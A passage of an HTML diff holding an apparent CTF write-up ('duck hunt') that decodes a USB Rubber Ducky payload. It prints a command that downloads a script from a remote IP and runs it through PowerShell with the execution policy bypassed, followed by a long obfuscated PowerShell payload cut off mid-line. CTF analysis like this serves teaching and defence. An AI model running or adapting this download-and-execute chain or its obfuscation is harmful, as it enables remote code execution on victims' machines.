+&lt;p align=&quot;center&quot;&gt;[그림] decode site&lt;/p&gt;
+
+&lt;p&gt;After Binary file decode, you can see that original “ducky code”.
+&lt;img src=&quot;/assets/images/2018-03-26-Securinets-CTF-duck-hunt-300/decode_file.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] original ducky code&lt;/p&gt;
+
+&lt;p&gt;This is ducky code. you can see “http://34.240.44.38/payload.txt” about “GET url”.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DELAY
+ADELAY
+DELAY
+DELAY
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &amp;amp; &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .haxor &amp;amp; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .haxor &amp;amp; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET  http://34.240.44.38/payload.txt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file.PS1 &amp;amp; powershell &lt;span class=&quot;nt&quot;&gt;-ExecutionPolicy&lt;/span&gt; ByPass &lt;span class=&quot;nt&quot;&gt;-File&lt;/span&gt; file.ps1
+DELAY
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can tell from the payload.txt that it is a powershell script, and seems to have a simple obfuscation. Nothing is a problem. This is “payload.txt” (powershell script)&lt;/p&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${=}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${+}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${@}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${.}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${[}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${]}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${(}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${)}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&amp;amp;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${|}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${)}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${+}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${@}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$?&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${+}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${=}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${[}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$?&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${+}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${.}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${[}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${&amp;amp;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${(}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${&amp;amp;}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${[}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${)}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${[}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${&amp;amp;}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${(}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${)}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${[}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${&amp;amp;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${[}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${)}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${&amp;amp;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${@}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${&amp;amp;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${&amp;amp;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${@}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${@}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${[}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${@}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span 